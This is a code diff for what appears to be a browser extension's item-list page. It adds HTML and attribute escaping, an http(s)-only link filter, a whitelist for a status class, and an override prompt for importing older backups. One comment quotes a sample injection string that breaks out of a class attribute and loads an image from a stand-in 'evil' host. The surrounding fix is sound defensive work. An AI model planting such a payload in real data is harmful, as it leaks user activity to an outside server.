@@ -50,16 +50,19 @@ function renderFacets() {
       if (!range) continue
       const box = document.createElement('div')
       box.className = 'facet'
-      const unit = facet.unit ? ` ${facet.unit}` : ''
-      box.innerHTML = `<h3>${facet.label}</h3>
+      // Facet manifests come from bundled connector code rather than from data, so this is
+      // belt-and-braces — but a rule that holds only for some interpolations is a rule nobody
+      // can check, and the bool branch below already escapes.
+      const unit = facet.unit ? ` ${escapeHtml(facet.unit)}` : ''
+      box.innerHTML = `<h3>${escapeHtml(facet.label)}</h3>
         <div class="range">
-          <input type="number" data-key="${facet.key}" data-side="min" placeholder="min">
+          <input type="number" data-key="${escapeAttr(facet.key)}" data-side="min" placeholder="min">
           <span class="hint">–</span>
-          <input type="number" data-key="${facet.key}" data-side="max" placeholder="max">
+          <input type="number" data-key="${escapeAttr(facet.key)}" data-side="max" placeholder="max">
           <span class="hint">${unit}</span>
         </div>
         <div class="hint">${range.count} of ${items.length} items · ${round(range.min)}–${round(range.max)}${unit}${
-          facet.capOpen && facet.cap ? ` · ${facet.cap}${unit}+ is open-ended` : ''}</div>`
+          facet.capOpen && facet.cap ? ` · ${escapeHtml(facet.cap)}${unit}+ is open-ended` : ''}</div>`
       $('facets').append(box)
     } else if (facet.type === 'term') {
       const counts = termCounts(items, facet)
@@ -69,8 +72,8 @@ function renderFacets() {
       const options = counts.slice(0, 40)
         .map((t) => `<option value="${escapeAttr(t.value)}">${escapeHtml(t.value)} (${t.count})</option>`)
         .join('')
-      box.innerHTML = `<h3>${facet.label}</h3>
-        <select data-key="${facet.key}" data-side="term"><option value="">any</option>${options}</select>`
+      box.innerHTML = `<h3>${escapeHtml(facet.label)}</h3>
+        <select data-key="${escapeAttr(facet.key)}" data-side="term"><option value="">any</option>${options}</select>`
       $('facets').append(box)
     } else if (facet.type === 'bool') {
       // Tri-state, not a checkbox. A checkbox cannot say "either" — it collapses "show me the
@@ -121,8 +124,40 @@ function onFilterChange(event) {
 }
 
 const round = (n) => (Number.isInteger(n) ? n : Math.round(n * 10) / 10)
-const escapeHtml = (s) => String(s).replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]))
-const escapeAttr = (s) => String(s).replace(/"/g, '&quot;')
+
+/**
+ * EVERY interpolation below is escaped, including the ones whose values "cannot" contain markup.
+ *
+ * Items reach this page from two places: a connector, and an imported interchange file. The
+ * second is not trusted input — `mergeBundle` takes the records as they come, so a hand-edited
+ * or hostile .jsonl can put any string in any field. `liveness.state` and `order` were both
+ * interpolated raw here, and `liveness.state` lands inside a `class="..."` attribute, so a value
+ * like `x"><img src=https://evil/?c=1>` injects an element.
+ *
+ * Manifest V3's default CSP (`script-src 'self'`) does block the script half of that — no
+ * `javascript:` URL, no inline handler. It does NOT restrict `img-src`, so the injected element
+ * still fires a request, which quietly breaks the one promise this extension makes: that
+ * nothing leaves your machine. Escaping at the sink costs nothing and does not depend on a CSP
+ * staying the way it is.
+ */
+const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => (
+  { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]))
+const escapeAttr = escapeHtml
+
+/**
+ * Only http(s) survives into an `href`.
+ *
+ * CSP blocks `javascript:` today, but a link is also the one place a hostile file could point a
+ * click somewhere the user did not choose. Anything else renders as inert text.
+ */
+function safeHref(url) {
+  try {
+    const parsed = new URL(String(url), 'https://invalid.invalid/')
+    return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? parsed.href : null
+  } catch {
+    return null
+  }
+}
 
 function matchesSearch(item, query) {
   if (!query) return true
@@ -145,15 +180,23 @@ function render() {
     const tr = document.createElement('tr')
     const order = Object.values(item.order ?? {})[0] ?? ''
     const metrics = Object.entries(item.metrics ?? {})
-      .map(([k, v]) => `${k} ${v.toLocaleString()}`).join('  ')
+      .map(([k, v]) => `${k} ${typeof v === 'number' ? v.toLocaleString() : v}`).join('  ')
+    const label = escapeHtml(item.title || item.id || '(untitled)')
+    const href = safeHref(item.url)
+    // A liveness value from a hostile file is not one of the four states; render it as the
+    // literal string it is, and never let it choose the class.
+    const state = String(item.liveness?.state ?? 'unknown')
+    const knownState = ['live', 'gone', 'restricted', 'unknown'].includes(state) ? state : 'unknown'
+
     tr.innerHTML = `
-      <td class="num">${order}</td>
-      <td><a href="${escapeAttr(item.url)}" target="_blank" rel="noreferrer noopener">${
-        escapeHtml(item.title || item.id)}</a>${
+      <td class="num">${escapeHtml(order)}</td>
+      <td>${href
+        ? `<a href="${escapeAttr(href)}" target="_blank" rel="noreferrer noopener">${label}</a>`
+        : `${label} <span class="muted small">(no usable link)</span>`}${
         item.byline?.name ? `<div class="muted small">${escapeHtml(item.byline.name)}</div>` : ''}</td>
       <td class="mono">${escapeHtml(item.source)}</td>
       <td class="num">${escapeHtml(metrics)}</td>
-      <td class="state ${item.liveness?.state ?? 'unknown'}">${item.liveness?.state ?? 'unknown'}${
+      <td class="state ${knownState}">${escapeHtml(state)}${
         item.membership?.state === 'unlisted' ? '<div class="muted small">unlisted</div>' : ''}</td>`
     $('rows').append(tr)
   }
@@ -206,9 +249,30 @@ $('import').addEventListener('change', async (event) => {
 
   if (!result?.ok) {
     if (result?.reason === 'stale') {
-      notice(`Refused: that file is generation ${result.incomingGeneration}, and this collection `
-        + `is already at ${result.localGeneration}. Importing it would roll your collection back.`)
-    } else if (result?.reason === 'no-connector') {
+      // The guard is right to fire, and it must be overridable. After "Delete everything" the
+      // generation deliberately survives the wipe, so restoring your OWN backup hits this every
+      // time — and with no way past it the extension would refuse to give you your data back,
+      // which is the exact opposite of the thing it exists to do.
+      const proceed = confirm(
+        `That file is generation ${result.incomingGeneration} and this collection is already at `
+        + `${result.localGeneration}, so it is an older snapshot of the same collection.\n\n`
+        + 'Importing it will merge it in. Nothing is deleted either way — items already here '
+        + 'that are missing from the file are kept.\n\nImport it anyway?',
+      )
+      if (!proceed) {
+        notice('Import cancelled — nothing changed.')
+        return
+      }
+      const forced = await send('importFile', { text, name: file.name, force: true })
+      if (!forced?.ok) {
+        notice(`Import failed: ${forced?.reason ?? forced?.error ?? 'unknown'}`)
+        return
+      }
+      notice(`Imported ${file.name}: ${forced.added} new, ${forced.merged} merged. Nothing was deleted.`)
+      await load()
+      return
+    }
+    if (result?.reason === 'no-connector') {
       notice('No bundled connector recognises that page, and it is not an interchange file.')
     } else {
       notice(`Import failed: ${result?.reason ?? result?.error ?? 'unknown'}`)
